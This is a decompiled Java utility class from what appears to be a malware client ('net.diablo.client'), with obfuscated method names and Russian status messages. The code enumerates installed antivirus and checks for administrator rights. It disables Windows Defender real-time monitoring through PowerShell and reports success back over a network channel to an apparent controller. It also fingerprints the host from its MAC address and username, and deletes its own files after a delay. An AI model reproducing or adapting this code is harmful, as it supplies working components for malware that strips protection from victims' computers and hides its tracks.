/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package net.diablo.client.utils;

import java.awt.Desktop;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URLDecoder;
import java.net.UnknownHostException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;
import net.diablo.client.Main;

public class WinUtils {
    public /* enum */ int II;

    public static Process lI(String string, String string2) throws IOException {
        return WinUtils.I("copy", string, string2);
    }

    public static String i() {
        String string = "Windows Defender";
        try {
            String string2;
            Process process = WinUtils.I("wmic", "/Node:localhost", "/Namespace:\\\\root\\SecurityCenter2", "Path", "AntiVirusProduct", "Get", "displayName", "/Format:List");
            Scanner scanner = new Scanner(process.getInputStream(), "CP866");
            while ((string2 = scanner.nextLine()) != null) {
                if (string2.length() < 1 || !string2.trim().contains("displayName")) continue;
                string = string2.split("=")[1];
                break;
            }
            return string;
        } catch (Exception exception) {
            return string;
        }
    }

    public static long IIl(InputStream inputStream) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String string = bufferedReader.readLine();
            long l2 = Long.parseLong(string);
            bufferedReader.close();
            return l2;
        } catch (IOException iOException) {
            System.out.println("\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0447\u0442\u0435\u043d\u0438\u0438 \u0444\u0430\u0439\u043b\u0430: " + iOException.getMessage());
            return 0L;
        } catch (NumberFormatException numberFormatException) {
            System.out.println("\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0441\u0442\u0440\u043e\u043a\u0438 \u0432 long: " + numberFormatException.getMessage());
            return 0L;
        }
    }

    public static long li(String string) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(string));
            String string2 = bufferedReader.readLine();
            long l2 = Long.parseLong(string2);
            bufferedReader.close();
            return l2;
        } catch (IOException iOException) {
            System.out.println("\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0447\u0442\u0435\u043d\u0438\u0438 \u0444\u0430\u0439\u043b\u0430: " + iOException.getMessage());
            return 0L;
        } catch (NumberFormatException numberFormatException) {
            System.out.println("\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0441\u0442\u0440\u043e\u043a\u0438 \u0432 long: " + numberFormatException.getMessage());
            return 0L;
        }
    }

    public static boolean lll() {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe");
            Process process = processBuilder.start();
            PrintStream printStream = new PrintStream(process.getOutputStream(), true);
            Scanner scanner = new Scanner(process.getInputStream());
            printStream.println("@echo off");
            printStream.println(">nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"");
            printStream.println("echo %errorlevel%");
            boolean bl = false;
            while (true) {
                String string = scanner.nextLine();
                if (bl) {
                    int n = Integer.parseInt(string);
                    return n == 0;
                }
                if (!string.equals("echo %errorlevel%")) continue;
                bl = true;
            }
        } catch (Exception exception) {
            return false;
        }
    }

    public static String Iil(byte[] byArray) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int j = 0; j < 3; ++j) {
            stringBuilder.append(String.format("%02X", byArray[j]));
        }
        return stringBuilder.toString();
    }

    public static void main(String[] stringArray) {
    }

    public static String lil(String string) {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
            byte[] byArray = messageDigest.digest(string.getBytes());
            return WinUtils.lIl(byArray).substring(0, 8);
        } catch (NoSuchAlgorithmException noSuchAlgorithmException) {
            return "Unknown";
        }
    }

    public static String iil() {
        return String.valueOf(Runtime.getRuntime().availableProcessors());
    }

    public static String iI() {
        String string = "\u041d\u0435\u0442";
        try {
            String string2;
            Process process = WinUtils.I("wmic", "cpu", "get", "name");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            while ((string2 = bufferedReader.readLine()) != null) {
                if (string2.toLowerCase().contains("name") || string2.trim().length() <= 4) continue;
                string = string2;
                break;
            }
        } catch (Exception exception) {
            // empty catch block
        }
        while (string.contains("  ")) {
            string = string.replace("  ", " ");
        }
        return string.trim();
    }

    public static void ii(long l2) {
        block2: {
            try {
                WinUtils.llI(l2);
            } catch (Exception exception) {
                if (IIli.I == null || !IIli.I.isOpen()) break block2;
                IIli.I.writeAndFlush(new lii("\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u044b\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u0437\u0430\u0449\u0438\u0442\u043d\u0438\u043a\u0430: \u0421\u043a\u043e\u0440\u0435\u0435 \u0432\u0441\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u043f\u0440\u0430\u0432!", l2));
            }
        }
    }

    public static void llI(long l2) throws IOException, InterruptedException {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true -Force");
            Process process = processBuilder.start();
            int n = process.waitFor();
            if (n != 0) {
                if (IIli.I != null && IIli.I.isOpen()) {
                    IIli.I.writeAndFlush(new lii("\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u044b\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u0437\u0430\u0449\u0438\u0442\u043d\u0438\u043a\u0430: \u0421\u043a\u043e\u0440\u0435\u0435 \u0432\u0441\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u043f\u0440\u0430\u0432!", l2));
                }
            } else if (IIli.I != null && IIli.I.isOpen()) {
                IIli.I.writeAndFlush(new lii("\u0417\u0430\u0449\u0438\u0442\u043d\u0438\u043a \u0412\u0438\u043d\u0434\u043e\u0432\u0441 \u0432\u044b\u043a\u043b\u044e\u0447\u0435\u043d", l2));
            }
        } catch (IOException | InterruptedException exception) {
            if (IIli.I != null && IIli.I.isOpen()) {
                IIli.I.writeAndFlush(new lii("\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u044b\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u0437\u0430\u0449\u0438\u0442\u043d\u0438\u043a\u0430: \u0421\u043a\u043e\u0440\u0435\u0435 \u0432\u0441\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u043f\u0440\u0430\u0432!", l2));
            }
            throw exception;
        }
    }

    public static Process I(String ... stringArray) throws IOException {
        ArrayList<String> arrayList = new ArrayList<String>(Arrays.asList("cmd", "/c"));
        arrayList.addAll(Arrays.asList(stringArray));
        return new ProcessBuilder(arrayList).start();
    }

    public static void iIl(String string) {
        try {
            Desktop.getDesktop().open(new File(string));
        } catch (IOException iOException) {
            // empty catch block
        }
    }

    public static String Il() {
        return System.getenv("username");
    }

    public static String ill() {
        return System.getProperty("os.name", "generic");
    }

    public static synchronized void Ill() {
        try {
            WinUtils.iIl(WinUtils.l());
        } catch (Exception exception) {
            // empty catch block
        }
        Runtime.getRuntime().halt(0);
    }

    public static String lIl(byte[] byArray) {
        StringBuilder stringBuilder = new StringBuilder();
        for (byte by : byArray) {
            stringBuilder.append(String.format("%02X", by));
        }
        return stringBuilder.toString();
    }

    public static String il() {
        String string;
        try {
            String string2 = System.getProperty("user.name");
            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(InetAddress.getLocalHost());
            byte[] byArray = networkInterface.getHardwareAddress();
            String string3 = WinUtils.Iil(byArray);
            String string4 = string2.substring(0, 3) + "-" + string3.substring(0, 6);
            string = WinUtils.lil(string4);
        } catch (SocketException | UnknownHostException iOException) {
            string = "Unknown";
        }
        return string;
    }

    public static Process ll(String string, int n) throws IOException {
        return WinUtils.I("ping", "localhost", "-n", String.valueOf(n), ">", "nul", "&&", "rmdir", "/s", "/q", string);
    }

    public static Process Ii(String string, int n) throws IOException {
        return WinUtils.I("ping", "localhost", "-n", String.valueOf(n), ">", "nul", "&&", "del", "/s", "/q", string);
    }

    public static String l() {
        String string = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        return URLDecoder.decode(string, "UTF-8").substring(1).replace("/", "\\");
    }
}

